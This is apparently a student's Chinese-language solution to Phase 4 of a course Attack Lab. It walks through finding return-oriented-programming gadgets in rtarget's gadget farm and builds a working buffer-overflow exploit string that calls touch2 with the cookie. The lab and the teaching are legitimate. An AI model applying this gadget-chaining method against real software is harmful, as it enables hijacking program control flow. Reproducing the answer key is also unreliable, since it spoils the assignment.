@@ -1,0 +1,269 @@
+----------------------------------------------------------------------------
+rt1:
+----------------------------------------------------------------------------
+For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your
+gadget farm. You can construct your solution using gadgets consisting of the following instruction types,
+and using only the first eight x86-64 registers (%rax–%rdi).
+movq : The codes for these are shown in Figure 3A.
+popq : The codes for these are shown in Figure 3B.
+ret : This instruction is encoded by the single byte 0xc3.
+nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single
+byte 0x90. Its only effect is to cause the program counter to be incremented by 1.
+Some Advice:
+• All the gadgets you need can be found in the region of the code for rtarget demarcated by the
+functions start_farm and mid_farm.
+• You can do this attack with just two gadgets.
+• When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit
+string will contain a combination of gadget addresses and data.	
+----------------------------------------------------------------------------
+在阶段四我们需要用ROP攻击方式去攻击rtarget(ROP的全称为Return-oriented programming（返回导向编程）,其主要思想是在栈缓冲区溢出的基础上!!!，利用程序中已有的小片段!!! (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。)
+rt1阶段可用的片段为：从start_farm()函数开始到end_farm()结束中间所有的代码片段。具体如下farm.d文件(自己建立的,实际片段可以在rtarget.d文件(如果没有此文件请看前置工作内容)里面查找)
+----------------------------------------------------------------------------
+farm.d:
+0000000000401994 <start_farm>:
+  401994:	b8 01 00 00 00       	mov    $0x1,%eax
+  401999:	c3                   	retq   
+
+000000000040199a <getval_142>:
+  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+  40199f:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+00000000004019ae <setval_237>:
+  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
+  4019b4:	c3                   	retq   
+
+00000000004019b5 <setval_424>:
+  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
+  4019bb:	c3                   	retq   
+
+00000000004019bc <setval_470>:
+  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
+  4019c2:	c3                   	retq   
+
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019d0 <mid_farm>:
+  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
+  4019d5:	c3                   	retq   
+
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
+
+00000000004019e1 <setval_296>:
+  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
+  4019e7:	c3                   	retq   
+
+00000000004019e8 <addval_113>:
+  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
+  4019ee:	c3                   	retq   
+
+00000000004019ef <addval_490>:
+  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
+  4019f5:	c3                   	retq   
+
+00000000004019f6 <getval_226>:
+  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
+  4019fb:	c3                   	retq   
+
+00000000004019fc <setval_384>:
+  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
+  401a02:	c3                   	retq   
+
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+
+0000000000401a0a <setval_276>:
+  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
+  401a10:	c3                   	retq   
+
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq   
+
+0000000000401a18 <getval_345>:
+  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
+  401a1d:	c3                   	retq   
+
+0000000000401a1e <addval_479>:
+  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
+  401a24:	c3                   	retq   
+
+0000000000401a25 <addval_187>:
+  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
+  401a2b:	c3                   	retq   
+
+0000000000401a2c <setval_248>:
+  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
+  401a32:	c3                   	retq   
+
+0000000000401a33 <getval_159>:
+  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+  401a38:	c3                   	retq   
+
+0000000000401a39 <addval_110>:
+  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
+  401a3f:	c3                   	retq   
+
+0000000000401a40 <addval_487>:
+  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
+  401a46:	c3                   	retq   
+
+0000000000401a47 <addval_201>:
+  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
+  401a4d:	c3                   	retq   
+
+0000000000401a4e <getval_272>:
+  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
+  401a53:	c3                   	retq   
+
+0000000000401a54 <getval_155>:
+  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
+  401a59:	c3                   	retq   
+
+0000000000401a5a <setval_299>:
+  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
+  401a60:	c3                   	retq   
+
+0000000000401a61 <addval_404>:
+  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
+  401a67:	c3                   	retq   
+
+0000000000401a68 <getval_311>:
+  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
+  401a6d:	c3                   	retq   
+
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	retq   
+
+0000000000401a75 <setval_328>:
+  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
+  401a7b:	c3                   	retq   
+
+0000000000401a7c <setval_450>:
+  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
+  401a82:	c3                   	retq   
+
+0000000000401a83 <addval_358>:
+  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
+  401a89:	c3                   	retq   
+
+0000000000401a8a <addval_124>:
+  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
+  401a90:	c3                   	retq   
+
+0000000000401a91 <getval_169>:
+  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
+  401a96:	c3                   	retq   
+
+0000000000401a97 <setval_181>:
+  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
+  401a9d:	c3                   	retq   
+
+0000000000401a9e <addval_184>:
+  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
+  401aa4:	c3                   	retq   
+
+0000000000401aa5 <getval_472>:
+  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
+  401aaa:	c3                   	retq   
+
+0000000000401aab <setval_350>:
+  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
+  401ab1:	c3                   	retq   
+
+0000000000401ab2 <end_farm>:
+  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
+  401ab7:	c3                   	retq   
+  401ab8:	90                   	nop
+  401ab9:	90                   	nop
+  401aba:	90                   	nop
+  401abb:	90                   	nop
+  401abc:	90                   	nop
+  401abd:	90                   	nop
+  401abe:	90                   	nop
+  401abf:	90                   	nop
+----------------------------------------------------------------------------
+开始寻找可用片段，根据建议的提示查表查找；
+也可以进行gcc编译.s生成可执行文件.o后objdump反汇编出机器码
+inc.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	58                   	pop    %rax
+   1:	97                   	xchg   %eax,%edi
+   2:	c3                   	retq   
+然后我们在farm.d文件里面查询58可以找到片段之一为：
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+----------------------------------------------------------------------------
+可以看到有 58 90 c3 , 对应着是 pop %rax , nop , ret（nop是不干任何事，不影响结果），刚好符合我们的需求。
+那么就要找到它的地址，可以看到4019a7: 8d 87 51 73 58 90 这个意思是8d这个机器码对应的地址是4019a7
+那么往后数，4019a7 + 1 = 4019a8对应着是87 ， 4019a9对应着是51， 4019aa对应着是73
+以此类推我们要的58就是4019ab
+----------------------------------------------------------------------------
+所有在返回地址中输入0x4019ab那么就会跳到addval_219()函数片段里面运行机器码58 90 c3，对应汇编为 pop %rax , nop , ret
+因为 90机器码对应着是nop无任何操作，所有无关紧要。
+这个时候如果返回地址后面跟上cookie值，那么cookie值就会因为pop指令进入到rax寄存器中。现在就要想方设法把cookie值从rax寄存器传递到rdi寄存器里面。
+----------------------------------------------------------------------------
+首先想到的是交换指令xchg和传递指令mov
+目前已经找到了pop %rax,但发现xchg %eax,%edi对应的机器码97并没有出现在farm.d的机器码里面，所有就不能找到想要的。
+----------------------------------------------------------------------------
+这时候就需要换一个思路。
+既然交换内容不行，那么直接传递呢？ mov %rax , % rdi或者 movl %eax , %edi
+查表后可以得到我们需要查找的机器码为48 89 c7或者89 c7
+----------------------------------------------------------------------------
+刚好就能找到48 89 c7 c3
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3   
+----------------------------------------------------------------------------
+注意我们ROP攻击最后肯定要跟上C3，不然返回不回去，然后未知机器码最好慎用！！！
+得到地址为4019a0 + 2 = 4019a2 , 其实就是往后数，可以理解一下。
+----------------------------------------------------------------------------
+最后执行流程就是 getbuf() -> pop %rax(从栈顶读入cookie值) - > ret -> mov %rax , %rdi -> ret -> touch2()
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+<<pop %rax , ret>指令的地址>
+<cookie值>
+<<mov %rax , %rdi , ret>指令的地址>
+<touch2()函数地址>
+----------------------------------------------------------------------------
+rt1.txt:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+----------------------------------------------------------------------------
